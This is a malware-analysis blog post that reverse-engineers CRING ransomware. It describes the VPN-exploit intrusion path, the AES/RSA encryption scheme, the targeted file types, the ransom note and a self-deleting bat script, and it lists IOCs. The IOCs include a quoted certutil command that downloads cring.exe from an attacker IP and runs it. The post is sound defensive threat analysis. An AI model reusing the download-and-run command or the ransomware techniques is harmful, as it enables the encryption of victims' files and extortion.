---
layout: post
title:  "CRING ransomware"
date:   2021-04-08
categories: reversing
---

## Introduction

As pointed out by [Kaspersky](https://usa.kaspersky.com/about/press-releases/2021_na-cring-ransomware-infects-industrial-targets-through-vulnerability-in-vpn-servers), CRING is a human-operated ransomware that is connected with a series of attacks that targeted European industrial companies. These attacks were noticed by the [Swisscom CSIRT](https://twitter.com/swisscom_csirt/status/1354052879158571008?s=20) team in early 2021, but until now it was unclear how the attackers breached the companies to ultimately deploy the ransomware.

Kaspersky says, that an incident investigation made by their ICS CERT Experts team provided evidence that the attackers exploited a vulnerability in the VPN servers.

The vulnerability in question was [CVE-2018-13379](https://nvd.nist.gov/vuln/detail/CVE-2018-13379), which allowed attackers to gain access to Fortigate appliances. From there the attackers used Mimikatz to steal credentials of the users who had logged in to the compromised server.

After gaining access to the domain administrator account, the attackers did a proper reconnaissance of the target environment to choose the most valuable servers to deploy the ransomware.

The following diagram shows the attack path of these intrusions.

![ ](/assets/images/cring_ransomware/image-20210407220854212.png)

The tweet made by Swisscom CSIRT also shows some of the TTPs used by the attacker, such as the usage of certutil to download the CRING ransomware, and mimikatz/prodump to gain access to credential material.

![ ](/assets/images/cring_ransomware/image-tweet.png)

## Ransomware Analysis

File hash: d8415a528df5eefcb3ed6f1a79746f40

As seen below, there some non-standard section names, and also all sections are writable and executable. This means that the ransomware is packed.

![ ](/assets/images/cring_ransomware/image-20210408084205537.png)

Unpacking the ransomware revealed that CRING is written in .NET.

![ ](/assets/images/cring_ransomware/image-20210408084857064.png)

The first action taken by CRING is to kill the MSSQL process:

![ ](/assets/images/cring_ransomware/image-20210407231629992.png)

Next, it checks the command line arguments and starts executing, only if, the number of supplied arguments is exactly 1 and if it is equals to `cc`.

![ ](/assets/images/cring_ransomware/image-20210407232007496.png)

CRING targets the following file extensions:

```
"*.txt",
"*.doc?",
"*.xls?",
"*.mdb",
"*.mdf",
"*.sql",
"*.bak",
"*.ora",
"*.pdf",
"*.ppt?",
"*.dbf",
"*.zip",
"*.rar",
"*.aspx",
"*.php",
"*.jsp",
"*.bkf",
"*.csv"
```

The files are encrypted using AES encryption and are given the extension `.cring`.

For each file, a new AES key is generated which is then encrypted with a hardcoded RSA key and appended to the encrypted file.

![ ](/assets/images/cring_ransomware/image-20210407233722787.png)

RSA pub key:

```
<RSAKeyValue><Modulus>rWCKSB0ToYXx616kU5cMP9CsgdkWgOW+ZLtcCcDcI5U2QIolO/Bv7M2hV8BBNT0w3MMCL9rVAFfb5raQGDP8iHgG4bmwtxof9R1kALGkmxRKkjWhGgORSeH47G0QvbtPCqZjaOZ5SS11DkhG1qU7+UrbDiVpOVtxpl/+qs4p5Yr4co+Xz1Ad/a/mK2qIYi+BWJEZjP/ocrwkjG5F9ImwuhHP6o5bsowQ7dAaaa9lKhf4cCp+UQfXOzYH5xI2lNuxZdfKMNCCGwY5TEP0Scq34VIPJ8YeerL1JGaz6c3XqHxTnNv8HvPCLULf2zpJ04bz29af/KoapLUdGD+QLtu9o6DXjcDryB9cPVjx2bLSwicF1Z04o4rxiSiCiAmmvk/GVxJXtIACk9bqJFKvjQHD5dOgGkvKCFKBAJRHvo18vsq4RpDDPDD0Edd6X+TG3eFWk5mfKFFmb8KABmEjtG/OkjSUCXLjA5QbE2MBuLeJSDr31ShTPJu5O6/TjtJbHiynE63nawvenkSBC2LNeRkibBnHIV9DKFYXZXQdaP8COms8prE8UC2eXCjEUX+X+gY7cTMLktg3Nd0tayivcpCxz9LdB4w268DUfUTD+RD30foDemlE/BbTjlL0VcAEXZXmjmNvWMp26NOZIed7Ze2Z9fQr5n6wcgELYerkAo6jCkFF7R8iji9I433RG8YnerVy+L5HspQRWQ2MUYqcK8W0PlQ9wX28GZ6jv+dkU/3J23zfzg5jU4Rf1Z56a09lklXxJzKkimq7aLsnjs0VUDI12EUK/vZbSlQssAhQa1mKypo44RnXIitaK51twUXBfmwlSD7T6VI6lMUvkvYoQeQa839fgIcI5y23mMbhZc5pfB8UsHshG+eHXGUopx4l2MUlO9OTKJqJZgMYizq1BBe/uUprM6TXPNUj2STcPv4SbrrSaYe/21P8L92S+Tue26anfUQk8KmbwZte4bw9JCl3K3ke71bAN+6MgnrvOadCsASLxEwCUmBpj1JekZoJijOX00RQO8DwpWp3JxSgI8FBj28oucMuAm+wHENzUJ3BY4i2YqMBGudfCYI3KY3BdvjQQByGgT9jVcEBalYTWvurtshZ04VwFNtjBqoPLB9ZQsi/KFc/OZC2w3bIPMap6ApRHNdm+RqPc89gPBsoJXMi9NC+rZ7FRECV9UpfHKWeroNgjKJE6frbbfD2dvrcoMidYFIjp46EylFp/5Q2+nDIROpL482mEdYgTIuQxXYTT1oClw1Bo9nyDuqPR6kqshrMY847jrFu18CKP9gbAeYMfHzplOHLqEvWY6d82xCPJ+Wcv5+JUc2N97rIseUMGDm9iwVUftRuWwMW/gwQ1NOcVQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
```

An interesting point is that this ransomware is what we call a "copy ransomware" as it creates a new file with the encrypted bytes and deletes the original one. This can make recovery possible in some cases.

![ ](/assets/images/cring_ransomware/image-20210407234151655.png)

To finish, CRING writes the ransom note and drops a bat script to remove itself from the disk.

![ ](/assets/images/cring_ransomware/image-20210407233120561.png)

Dropping `killme.bat`:

![ ](/assets/images/cring_ransomware/image-20210407235013753.png)

Bat file content:

```
@echo off
:tryagain
del %1
if exist %1 goto tryagain
del %0
```

Ransom note content:

```
Oops, your computer is encrypted. Don’t panic. You will be able to recover your important files through the decryption service, but you need to pay a different fee. You must contact us by email. If we don’t receive the decryption request within a week, we may no longer Provide services
Contact: qkhooks0708@protonmail.com
```

## IOCs

```
# IOCs shared by Swisscom CSIRT

38217fa569df8f93434959c1c798b29d (mimikatz dropping ProcDump to dump lsass.exe)

8d156725c6ce172b59a8d3c92434c352 (beacon)

Extracted from beacon:
www.mircoupdate.https443[.]net
104.168.30[.]164

8d1650e5e02cd1934d21ce57f6f1af34 (download and run CRING ransomware)

Commands executed:
certutil -urlcache -split -f "http://45.142.213.40/cc.txt" c:\\users\\cring.exe
c:\\users\\cring.exe cc

d8415a528df5eefcb3ed6f1a79746f40 (Cring executable)

# IOCs shared by Kaspersky ICS CERT

%temp%\execute.bat (downloader script - File path)
C:\__output (Cring executable - File path)

c5d712f82d5d37bb284acd4468ab3533 (Cring executable)
317098d8e21fa4e52c1162fb24ba10ae (Cring executable)
44d5c28b36807c69104969f5fed6f63f (downloader script)

129.227.156[.]216 (used by the threat actor during the attack)
129.227.156[.]214 (used by the threat actor during the attack)
198.12.112[.]204 (Cobalt Strike CnC)
45.67.231[.]128 (malware hosting)
```

## References

* [Kaspersky Report](https://usa.kaspersky.com/about/press-releases/2021_na-cring-ransomware-infects-industrial-targets-through-vulnerability-in-vpn-servers)
* [Kaspersky ICS CERT Report](https://ics-cert.kaspersky.com/reports/2021/04/07/vulnerability-in-fortigate-vpn-servers-is-exploited-in-cring-ransomware-attacks/)
* [TheRecord Media](https://therecord.media/new-cring-ransomware-deployed-via-unpatched-fortinet-vpns/)
* [Swisscom CSIRT](https://twitter.com/swisscom_csirt/status/1354052879158571008?s=20)



